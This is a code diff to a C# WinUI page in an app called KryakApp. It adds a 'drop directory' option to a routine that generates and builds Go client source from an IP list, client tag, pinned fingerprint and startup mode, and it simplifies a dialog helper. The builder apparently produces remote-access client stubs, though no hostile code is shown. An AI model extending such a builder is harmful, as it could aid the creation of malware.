@@ -1,5 +1,4 @@
 ﻿using KryakApp.Client;
-using KryakApp.Services;
 using Microsoft.UI.Xaml;
 using Microsoft.UI.Xaml.Controls;
 using System;
@@ -347,6 +346,11 @@ namespace KryakApp.Pages
                 await ShowSimpleDialogAsync("Build Failed", "Main window is unavailable.");
                 return;
             }
+            string dropDirectory = string.Empty;
+            if (DropCheckBox.IsChecked == true)
+            {
+                dropDirectory = DropDirectoryTextBox.Text.Trim();
+            }
 
             FileSavePicker savePicker = new();
             nint hwnd = WindowNative.GetWindowHandle(App.MainWindow);
@@ -377,7 +381,7 @@ namespace KryakApp.Pages
             string tempModPath = Path.Combine(tempBuildDir, "go.mod");
             string tempSumPath = Path.Combine(tempBuildDir, "go.sum");
             File.Delete(Path.Combine(tempBuildDir, "rsrc.syso"));
-            File.WriteAllText(tempGoPath, ClientSourceCode.GetClientCode(ipList, rawList, clientTag, securityMode, pinnedFingerprint, startupMode));
+            File.WriteAllText(tempGoPath, ClientSourceCode.GetClientCode(ipList, rawList, clientTag, securityMode, pinnedFingerprint, startupMode, dropDirectory));
             File.WriteAllText(tempModPath, ClientSourceCode.GetModCode());
             File.WriteAllText(tempSumPath, ClientSourceCode.GetSumCode());
 
@@ -546,7 +550,15 @@ namespace KryakApp.Pages
 
         private async Task ShowSimpleDialogAsync(string title, string content)
         {
-            await DialogHelper.ShowCopyableAsync(XamlRoot, title, content);
+            ContentDialog dialog = new()
+            {
+                Title = title,
+                Content = content,
+                XamlRoot = XamlRoot,
+                PrimaryButtonText = "OK"
+            };
+
+            await dialog.ShowAsync();
         }
 
         private sealed class ConnectionEntry
